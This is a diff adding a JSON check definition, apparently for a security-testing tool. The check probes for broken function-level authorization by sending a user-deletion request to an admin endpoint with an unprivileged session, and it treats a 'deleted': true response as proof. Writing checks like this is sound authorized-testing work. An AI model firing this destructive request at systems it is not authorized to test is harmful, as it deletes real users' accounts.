@@ -1,0 +1,36 @@
+{
+  "name": "web/Admin function reachable without privilege (BFLA)",
+  "description": "[high] Proves broken function-level authorization: an ADMIN action (user deletion) succeeds under an unprivileged session = API5 BFLA (CWE-285), complementing the IDOR object-level skill. Keywords: bfla function level authorization admin action unprivileged api5. ctrl: enforced RBAC returns 403 -> not falsified. base_url = admin action endpoint (copy with the operator's unprivileged context).",
+  "cwe": "CWE-285",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/api/admin/users/delete",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"user_id\":\"2\"}"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "\"deleted\"\\s*:\\s*true",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "cb04e27f86ad",
+  "created": "2026-11-06T04:51:35.422905+00:00",
+  "last_used": "2026-11-06T04:51:35.422905+00:00"
+}
